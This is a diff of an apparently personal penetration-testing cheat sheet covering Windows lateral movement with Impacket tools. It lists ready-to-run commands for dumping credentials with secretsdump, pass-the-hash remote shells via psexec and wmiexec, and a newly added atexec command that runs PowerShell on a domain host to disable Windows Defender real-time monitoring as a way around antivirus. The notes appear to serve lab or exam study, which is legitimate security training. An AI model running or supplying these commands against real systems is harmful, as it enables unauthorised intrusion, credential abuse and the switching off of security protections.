@@ -526,6 +526,8 @@ If you have path traversal plus a location with write access you can exploit tha
   `secretsdump.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
 - open cmd.exe on remote target with known hash:  
   `/usr/share/doc/python-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202 cmd.exe`  
+  If psexec is not possible because of AntiVirus, try atexec (and e.g. disable defender):   
+  `atexec.py -hashes :e481ed3ed667f5df3c3c3b0dc37ca25f9 winattacklab.local/ffast@10.0.1.100 "powershell -c Set-MpPreference -DisableRealtimeMonitoring \$true"`   
 - Open remote connection with known hash using wmiexec:  
   `wmiexec.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
 - connect to target with evil-winrm:   
